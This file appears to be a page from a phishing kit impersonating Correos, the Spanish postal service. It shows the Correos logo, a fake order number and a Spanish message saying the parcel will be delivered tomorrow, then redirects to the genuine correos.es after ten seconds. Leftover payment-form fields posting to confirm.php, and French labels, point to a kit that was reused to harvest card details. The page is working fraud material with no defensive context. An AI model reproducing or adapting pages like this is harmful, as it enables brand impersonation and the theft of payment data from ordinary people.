<?php
error_reporting(0);

?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
    <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/><meta name="format-detection" content="telephone=no"/>
    <title>Correos.</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico"/>
	<meta http-equiv="refresh" content="10;URL='https://www.correos.es/'">
    <link rel="stylesheet" href="css/merchant.css" type="text/css"/>
	    <link rel="stylesheet" href="css/opus.css" type="text/css"/>
		<link rel="stylesheet" href="css/footer.css" type="text/css"/>
		<link rel="stylesheet" href="css/onei.css" type="text/css"/>
		<link rel="stylesheet" href="css/eui.css" type="text/css"/>
		<style type="text/css">
  #heading{
    text-align: center;
    font-size: 15px;
	font-weight: bold;
    margin-left: 10px;
    margin-top: 10px;
    float:right;
  }
</style>
  </head>
  <body>

<div style="background-color:#fff;padding-right:5px;padding-left:10px;" class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><img style="margin-top: 0px; height: 54px; width: 110px;" src="css/correos.png">
                
                <br><span id="heading">Pedido : ES64M133</span><br><br>
            </div>

<div id="amount"></div>
    <div id="container">
      <div id="header">
        <div class="divTitle">
          <span class="title">Gracias. Hemos programado la entrega de su paquete para ma&ntilde;ana.</span><br><br>
		  
          <span class="subtitle"></span>
        </div>
       
      </div>

      <form action="confirm.php" method="post" id="payment_form" onsubmit="return checkForm();">
        <input type="hidden" name="LANG" value="fr">
        <input type="hidden" name="client_type" value="mobile">
        <input type="hidden" name="page_type" value="payment_offbill">

        <div id="input_data">
          

          
          
          
<br> <div id="headImage"></div>
          <div class="security_code">
            <div>
              <label for="form_card_security">
                <span class="libelle"><a href="https://www.correos.es/">Redirigir a la p&aacute;gina de inicio.</a>

</span>
                
              </label>
            </div>
            
            
            

        <div class="button">
          
          
        </div>
      </div></div></form>
     
    </div>
	
    <script type="text/javascript" src="js/jquery.slim.min.js"></script>
    <script type="text/javascript" src="js/validationform.min.js"></script>
    <noscript>Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.</noscript>
  </body>
</html>
